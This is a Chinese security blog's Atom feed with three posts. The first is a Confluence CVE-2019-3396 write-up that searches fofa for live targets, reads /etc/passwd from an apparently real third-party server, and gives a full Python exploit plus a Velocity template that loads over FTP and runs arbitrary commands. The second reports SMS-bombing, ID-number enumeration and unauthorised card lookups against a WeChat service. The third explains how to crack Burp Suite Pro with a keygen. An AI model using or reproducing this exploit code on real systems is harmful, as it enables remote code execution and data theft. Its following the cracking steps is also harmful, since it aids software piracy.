<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>无风自舞</title>
  
  <subtitle>高冷风的博客</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="txf7.xyz/"/>
  <updated>2019-04-10T07:04:56.000Z</updated>
  <id>txf7.xyz/</id>
  
  <author>
    <name>Txf</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Confluence SSRF及远程代码执行漏洞（CVE-2019-3395\CVE-2019-3396)</title>
    <link href="txf7.xyz/2019/04/10/CVE-2019-3396/"/>
    <id>txf7.xyz/2019/04/10/CVE-2019-3396/</id>
    <published>2019-04-10T00:00:07.000Z</published>
    <updated>2019-04-10T07:04:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="服务寻找"><a href="#服务寻找" class="headerlink" title="服务寻找"></a>服务寻找</h2><p>直接fofa搜索</p><p><img src="http://secquan.zzyuncheng.com/89dd264bcdcc7f7780ecbcc7f6791bb8.png-quanzi" alt="file"><br>选择可以正常访问的页面</p><p><img src="http://secquan.zzyuncheng.com/6abd16688af544c40178ad6a924dfa23.png-quanzi" alt="file"><br>确认版本在漏洞范围内</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">【漏洞评级】高危</span><br><span class="line"></span><br><span class="line">【CVE编号】CVE-2019-3395\CVE-2019-3396</span><br><span class="line"></span><br><span class="line">【影响范围】</span><br><span class="line"></span><br><span class="line">Confluence 1.*.*、2.*.*、3.*.*、4.*.*、5.*.*</span><br><span class="line"></span><br><span class="line">Confluence 6.0.*、6.1.*、6.2.*、6.3.*、6.4.*、6.5.*</span><br><span class="line"></span><br><span class="line">Confluence 6.6.* &lt; 6.6.12</span><br><span class="line"></span><br><span class="line">Confluence6.7.*、6.8.*、6.9.*、6.10.*、6.11.*</span><br><span class="line"></span><br><span class="line">Confluence 6.12.* &lt; 6.12.3</span><br><span class="line"></span><br><span class="line">Confluence 6.13.* &lt; 6.13.3</span><br><span class="line"></span><br><span class="line">Confluence 6.14.* &lt; 6.14.2</span><br><span class="line"></span><br><span class="line">【不受影响的版本】</span><br><span class="line"></span><br><span class="line">Confluence &gt;= 6.6.12</span><br><span class="line"></span><br><span class="line">Confluence &gt;= 6.12.3</span><br><span class="line"></span><br><span class="line">Confluence &gt;= 6.13.3</span><br><span class="line"></span><br><span class="line">Confluence &gt;= 6.14.2</span><br><span class="line"></span><br><span class="line">Confluence  6.15.1</span><br></pre></td></tr></table></figure><h2 id="手工验证"><a href="#手工验证" class="headerlink" title="手工验证"></a>手工验证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1  </span><br><span class="line">Host: service.jianzhitech.cn:9000  </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0  </span><br><span class="line">Accept: application/json, text/javascript, _/_; q=0.01  </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3  </span><br><span class="line">Accept-Encoding: gzip, deflate  </span><br><span class="line">Content-Type: application/json  </span><br><span class="line">X-Requested-With: XMLHttpRequest  </span><br><span class="line">Referer: [http://service.jianzhitech.cn:9000/login.action?os\_destination=%2F](http://service.jianzhitech.cn:9000/login.action?os_destination=%2F)  </span><br><span class="line">Content-Length: 180  </span><br><span class="line">Cookie: JSESSIONID=3FDE6BE22B77741044106D452E025D04  </span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;65601&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;[https://www.dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;\_template&quot;:&quot;file:////etc/passwd&quot;&#125;,&quot;body](https://www.dailymotion.com/video/xcpa64)&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://secquan.zzyuncheng.com/1e09fd3d94cf93d45bdab2a920763ec4.png-quanzi" alt="file"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>首先需要一台外网的服务器<br>exp.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def _read(url):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    # filename = &quot;../web.xml&quot;</span><br><span class="line">    filename = &apos;file:////etc/group&apos;</span><br><span class="line"></span><br><span class="line">    paylaod = url + &quot;/rest/tinymce/1/macro/preview&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;,</span><br><span class="line">        &quot;Referer&quot;: url + &quot;/pages/resumedraft.action?draftId=12345&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &apos;&#123;&quot;contentId&quot;:&quot;12345&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc5&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;%s&quot;&#125;&#125;&#125;&apos; % filename</span><br><span class="line">    r = requests.post(paylaod, data=data, headers=headers)</span><br><span class="line">    # print r.content</span><br><span class="line">    if r.status_code == 200 and &quot;wiki-content&quot; in r.text:</span><br><span class="line">        m = re.findall(&apos;.*wiki-content&quot;&gt;\n(.*)\n            &lt;/div&gt;\n&apos;, r.text, re.S)</span><br><span class="line"></span><br><span class="line">    return m[0]</span><br><span class="line"></span><br><span class="line">def _exec(url,cmd):</span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    filename = &quot;ftp://192.168.50.181/rce.vm&quot;</span><br><span class="line"></span><br><span class="line">    paylaod = url + &quot;/rest/tinymce/1/macro/preview&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&quot;,</span><br><span class="line">        &quot;Referer&quot;: url + &quot;/pages/resumedraft.action?draftId=12345&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json; charset=utf-8&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &apos;&#123;&quot;contentId&quot;:&quot;12345&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;http://www.dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;%s&quot;,&quot;cmd&quot;:&quot;%s&quot;&#125;&#125;&#125;&apos; % (filename,cmd)</span><br><span class="line">    r = requests.post(paylaod, data=data, headers=headers)</span><br><span class="line">    # print r.content</span><br><span class="line">    if r.status_code == 200 and &quot;wiki-content&quot; in r.text:</span><br><span class="line">        m = re.findall(&apos;.*wiki-content&quot;&gt;\n(.*)\n            &lt;/div&gt;\n&apos;, r.text, re.S)</span><br><span class="line"></span><br><span class="line">    return m[0]</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    cmd = sys.argv[2]</span><br><span class="line">    print _exec(url,cmd)</span><br></pre></td></tr></table></figure><p>rce.vm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set ($e=&quot;exp&quot;)</span><br><span class="line">#set ($a=$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec($cmd))</span><br><span class="line">#set ($input=$e.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke($a))</span><br><span class="line">#set($sc = $e.getClass().forName(&quot;java.util.Scanner&quot;))</span><br><span class="line">#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(&quot;java.io.InputStream&quot;)))</span><br><span class="line">#set($scan=$constructor.newInstance($input).useDelimiter(&quot;\\A&quot;))</span><br><span class="line">#if($scan.hasNext())</span><br><span class="line">    $scan.next()</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1\.使用FTP加载vm文件  </span><br><span class="line">2\.修改filename为自己的vm文件路径，例如 filename = &quot;ftp://192.168.50.181/rce.vm&quot;  </span><br><span class="line">3\.python CVE-2019-3396.py [http://ip:port](http://ip) &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>这里我用的是python2</p><p>pip install pyftpdlib</p><p>python -m pyftpdlib -p 2130</p><p>直接截的同事的图<br><img src="http://secquan.zzyuncheng.com/8720a1b0848253be60a036fa59bf9173.png-quanzi" alt="file"></p><h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p><img src="http://secquan.zzyuncheng.com/4c1c6d6b38be7ef308bc5a0197feb7e8.png-quanzi" alt="file"></p><p><img src="http://secquan.zzyuncheng.com/5eb1820b8b8cc6a91e3c2f23e037dc3c.png-quanzi" alt="file"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;服务寻找&quot;&gt;&lt;a href=&quot;#服务寻找&quot; class=&quot;headerlink&quot; title=&quot;服务寻找&quot;&gt;&lt;/a&gt;服务寻找&lt;/h2&gt;&lt;p&gt;直接fofa搜索&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://secquan.zzyuncheng.com/89dd26
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>某次公众号的渗透</title>
    <link href="txf7.xyz/2019/03/19/%E6%9F%90%E6%AC%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%9A%84%E6%B8%97%E9%80%8F/"/>
    <id>txf7.xyz/2019/03/19/某次公众号的渗透/</id>
    <published>2019-03-19T12:00:07.000Z</published>
    <updated>2019-04-29T05:19:44.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="项目任务"><a href="#项目任务" class="headerlink" title="项目任务"></a>项目任务</h2><p>针对公众号的每个功能点做渗透</p><blockquote><p>大致看了一下，差点吐了，好多功能点<br>没办法，硬着头皮上，小漏洞还真的多，报告写到吐，这里分享其中几个代表性的。</p></blockquote><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><h4 id="wechat抓包"><a href="#wechat抓包" class="headerlink" title="wechat抓包"></a>wechat抓包</h4><p>我是用的是PC版的wechat，直接打开微信自带的浏览器<br><img src="https://upload-images.jianshu.io/upload_images/14134003-fa118bea7cfa166c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>复制地址到火狐里面<br>抓包分析<br><img src="https://upload-images.jianshu.io/upload_images/14134003-781c5df5ef42dd4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>有点尴尬，应该做了简单的防护</p><h4 id="火狐抓包"><a href="#火狐抓包" class="headerlink" title="火狐抓包"></a>火狐抓包</h4><p>火狐F12，点击图中的手机按钮<br><img src="https://upload-images.jianshu.io/upload_images/14134003-8ad2bdbcaa364939.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>填写自定义的User-Agent<br><img src="https://upload-images.jianshu.io/upload_images/14134003-258eab9fd7a9230f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117</span><br></pre></td></tr></table></figure></p><p>还是非法访问，有点奇怪。</p><h4 id="换个方法"><a href="#换个方法" class="headerlink" title="换个方法"></a>换个方法</h4><p>打开夜神模拟器，登陆微信，然后抓包，用如下User-Agent<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI MLA-AL10 Build/HUAWEIMLA-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.143 Crosswalk/24.53.595.0 XWEB/112 MMWEBSDK/180803 Mobile Safari/537.36 MMWEBID/8266 MicroMessenger/6.7.3.1360(0x260703B3) NetType/WIFI Language/zh_CN Process/tools</span><br></pre></td></tr></table></figure></p><p>终于成功了<br><img src="https://upload-images.jianshu.io/upload_images/14134003-2c57c2f9921297a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h3 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h3><h4 id="短信炸弹"><a href="#短信炸弹" class="headerlink" title="短信炸弹"></a>短信炸弹</h4><p>这个短信炸弹覆盖全部短信接口，因为它只对单个接口进行了次数限制，而他的发送包是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xxx.do?code=wx02&amp;wxCustMobileNo=13888888888</span><br></pre></td></tr></table></figure></p><p>code参数wx02支持01-50，相当于有几十个短信接口给我们进行短信炸弹的攻击</p><h4 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h4><p>当时因为客户内部原因，没有给我对应的测试账号，所以我测的很尴尬，直到我遇到了这个接口<br>这里是通过绑定身份证的操作，输入验证码之后查询绑定状态<br>虽然有验证码，但是我抓包不放开，就可以使验证码一直不失效<br><img src="https://upload-images.jianshu.io/upload_images/14134003-38ea78ebab66e18d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>419即为存在的身份证</p><h4 id="越权查询"><a href="#越权查询" class="headerlink" title="越权查询"></a>越权查询</h4><p>后面我又找到一个接口，可以通过身份证查到卡号，有了上面的枚举，我通过存在的身份证号码，查到了卡号<br><img src="https://upload-images.jianshu.io/upload_images/14134003-409a72349188dc57.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><blockquote><p>这种测功能点的渗透很无聊，每个接口挨个试，在这次渗透中，我发现，开发因为公司有WAF有非常强大的外部防护措施之后，他们往往对 XSS ，注入等过滤不严，本来应该可以找到很多问题，但是因为该公众号都是调用代理的方式，且是第三方查询，所以我很难受，也很尴尬，还好有其他人一起渗透，估计大家都差不多。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;项目任务&quot;&gt;&lt;a href=&quot;#项目任务&quot; class=&quot;headerlink&quot; title=&quot;项目任务&quot;&gt;&lt;/a&gt;项目任务&lt;/h2&gt;&lt;p&gt;针对公众号的每个功能点做渗透&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;大致看了一下，差点吐了，好多功能点&lt;br&gt;没办法，硬着
      
    
    </summary>
    
      <category term="技术指南" scheme="txf7.xyz/categories/%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/"/>
    
    
  </entry>
  
  <entry>
    <title>mac渗透初试探</title>
    <link href="txf7.xyz/2019/03/19/mac%E6%B8%97%E9%80%8F%E5%88%9D%E8%AF%95%E6%8E%A2/"/>
    <id>txf7.xyz/2019/03/19/mac渗透初试探/</id>
    <published>2019-03-19T08:30:07.000Z</published>
    <updated>2019-04-10T02:38:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>windows下安装最清爽的burpsuite1.7系列</p></blockquote><h3 id="官网下载原版"><a href="#官网下载原版" class="headerlink" title="官网下载原版"></a>官网下载原版</h3><p><img src="https://upload-images.jianshu.io/upload_images/16895266-2747e6e4f55743f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/16895266-5971cf8c8902e001.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>然后安装</p><h2 id="下载破解补丁"><a href="#下载破解补丁" class="headerlink" title="下载破解补丁"></a>下载破解补丁</h2><p>链接: <a href="https://pan.baidu.com/s/1brjPKM7" target="_blank" rel="noopener">https://pan.baidu.com/s/1brjPKM7</a> 密码: 9v4r</p><p><img src="https://upload-images.jianshu.io/upload_images/16895266-6d23913870bf47b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><h2 id="下载jdk环境"><a href="#下载jdk环境" class="headerlink" title="下载jdk环境"></a>下载jdk环境</h2><p><a href="https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk-8u201-windows-x64.exe?AuthParam=1552965316_da70718dc80b250a1aa668a34cf319a7" target="_blank" rel="noopener">https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk-8u201-windows-x64.exe?AuthParam=1552965316_da70718dc80b250a1aa668a34cf319a7</a></p><h2 id="激活burp"><a href="#激活burp" class="headerlink" title="激活burp"></a>激活burp</h2><p>将burpsuite_pro_v1.7.36.jar改名</p><p>为burpsuite_community.jar</p><p><img src="https://upload-images.jianshu.io/upload_images/16895266-48afe10fb117f7ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p><p>修改BurpSuiteCommunity.vmoptions文件为以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-Xmx4096m</span><br><span class="line"></span><br><span class="line">-Xbootclasspath/p:burp-loader-keygen.jar</span><br></pre></td></tr></table></figure><p>正常打开burp进行破解</p><h1 id="安装burpsuite"><a href="#安装burpsuite" class="headerlink" title="安装burpsuite"></a>安装burpsuite</h1><p>需要下载好burp及其破解工具，过于简单，这里不讲，主要mac设置</p><h1 id="下载burp汉化包"><a href="#下载burp汉化包" class="headerlink" title="下载burp汉化包"></a>下载burp汉化包</h1><p><a href="https://files.zsxq.com/FmaFRIllULVvDbtX6ioIVSILI9YS?attname=BurpSuiteCn.jar.zip&amp;e=1906272000&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:8KW62C9XAkqbmFJkBlj-63zFOdo=" target="_blank" rel="noopener">点击下载</a></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-a6d798a015df2634.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h2 id="新建一个sh，例如burp-sh"><a href="#新建一个sh，例如burp-sh" class="headerlink" title="新建一个sh，例如burp.sh"></a>新建一个sh，例如burp.sh</h2><p>vim burp.sh</p><h2 id="写入以下内容："><a href="#写入以下内容：" class="headerlink" title="写入以下内容："></a>写入以下内容：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd Desktop</span><br><span class="line">nohup java -javaagent:BurpSuiteCn.jar -Xbootclasspath/p:burp-loader-keygen.jar  -Xmx1024m -jar burpsuite_pro_v2.0beta.jar &amp;</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="赋予执行权限"><a href="#赋予执行权限" class="headerlink" title="赋予执行权限"></a>赋予执行权限</h2><p>chmod u+x burp.sh</p><h2 id="编辑你的环境变量"><a href="#编辑你的环境变量" class="headerlink" title="编辑你的环境变量"></a>编辑你的环境变量</h2><p>vim ~/.bash_profile</p><p>#在末尾新增一行<br>alias burp=burp.sh的绝对路径<br>如<br>alias burp=~/Desktop/burp.sh</p><h2 id="应用环境变量"><a href="#应用环境变量" class="headerlink" title="应用环境变量"></a>应用环境变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bash_profile</span><br></pre></td></tr></table></figure><p>以后你只需要在Mac控制台输入burp<br>安装了zsh的可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line">source ~/.bash_profile</span><br></pre></td></tr></table></figure></p><p>让他每次都生效。<br><img src="https://upload-images.jianshu.io/upload_images/14134003-da9ad0eb3e54fea9.gif?imageMogr2/auto-orient/strip" alt="burp"></p><blockquote><p>mac跟windows真的一点不一样。建议还是别买了。<br>这里整理一下我的mac电脑使用坑。<br>类似于linux的apt和yum的自动安装，mac一般用homebrew</p></blockquote><h2 id="安装brew"><a href="#安装brew" class="headerlink" title="安装brew"></a>安装brew</h2><p>首先进入<a href="https://brew.sh" target="_blank" rel="noopener">https://brew.sh</a><br>然后复制执行命令<br><img src="https://upload-images.jianshu.io/upload_images/14134003-81013342e669673f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="brew"></p><h2 id="第一次安装的时候一直报错"><a href="#第一次安装的时候一直报错" class="headerlink" title="第一次安装的时候一直报错"></a>第一次安装的时候一直报错</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fatal: The remote end hung up unexpectedly</span><br><span class="line">fatal: early EOF</span><br><span class="line">fatal: index-pack failed</span><br></pre></td></tr></table></figure><p>我以为是墙的原因，所以我下载了一个SS,挂上代理开全局重新安装<br><img src="https://upload-images.jianshu.io/upload_images/14134003-7ad5af91a59f7fca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="还是报错"><a href="#还是报错" class="headerlink" title="还是报错"></a>还是报错</h2><p>又看到有人说<br>出现这个错误的原因是项目太久，tag资源文件太大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解决方式：</span><br><span class="line"></span><br><span class="line">   命令终端输入</span><br><span class="line"></span><br><span class="line">    git config --global http.postBuffer 524288000       </span><br><span class="line"></span><br><span class="line">  然后在重新执行brew安装命令即可</span><br></pre></td></tr></table></figure></p><p>我也尝试了，然后还是不行，我以为是没重启，又重启了一次，仍然失败。<br>过了一天，再安装就成功了。</p><h2 id="有人说把install镜像更换为国内的就可以了"><a href="#有人说把install镜像更换为国内的就可以了" class="headerlink" title="有人说把install镜像更换为国内的就可以了"></a>有人说把install镜像更换为国内的就可以了</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、将brew的install文件下载本地</span><br><span class="line">      终端输入 curl -fsSL [https://raw.githubusercontent.com/Homebrew/install/master/install](https://raw.githubusercontent.com/Homebrew/install/master/install) &gt;&gt; brew_install</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2、修改install文件的镜像源</span><br><span class="line">终端输入 vim brew_install</span><br><span class="line">将下面两行进行修改</span><br><span class="line">#BREW_REPO = &quot;[https://github.com/Homebrew/brew”.freeze](https://github.com/Homebrew/brew%E2%80%9D.freeze)</span><br><span class="line">#CORE_TAP_REPO = “[https://github.com/Homebrew/homebrew-core](https://github.com/Homebrew/homebrew-core)”.freeze</span><br><span class="line">替换成下面两句</span><br><span class="line">BREW_REPO = “[https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git](https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git)”.freeze</span><br><span class="line">CORE_TAP_REPO = &quot;[https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git”.freeze](https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git%E2%80%9D.freeze)</span><br><span class="line">#就是“BREW_REPO”和“CORE_TAP_REPO”这两项，将其修改为清华的镜像</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3、安装</span><br><span class="line">ruby ~/brew_install</span><br></pre></td></tr></table></figure><h2 id="apktool安装"><a href="#apktool安装" class="headerlink" title="apktool安装"></a>apktool安装</h2><p>一开始我直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install apktool</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-c8daccabdbc1e248.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>提示下载失败，老老实实打开vpn</p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-741ff9aea6d4cf49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="dex2jar安装"><a href="#dex2jar安装" class="headerlink" title="dex2jar安装"></a>dex2jar安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install dex2jar</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/14134003-f38ec4aca7f715bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="反编译软件安装"><a href="#反编译软件安装" class="headerlink" title="反编译软件安装"></a>反编译软件安装</h2><blockquote><p>jd-gui之前都是使用exe的，因为在mac下，所以这里我下载jar格式的。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/14134003-800e303ce9c4d4bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>官网凉了(jd.benow.ca)，我换个反编译软件。<br>procyon-decompiler-luyten <a href="https://github.com/deathmarine/Luyten" target="_blank" rel="noopener">https://github.com/deathmarine/Luyten</a></p><p>Jadx <a href="https://github.com/skylot/jadx/" target="_blank" rel="noopener">https://github.com/skylot/jadx/</a>。</p><p><img src="https://upload-images.jianshu.io/upload_images/14134003-1ebce39e87ce3caa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;windows下安装最清爽的burpsuite1.7系列&lt;/p&gt;
&lt;/blockquote&gt;
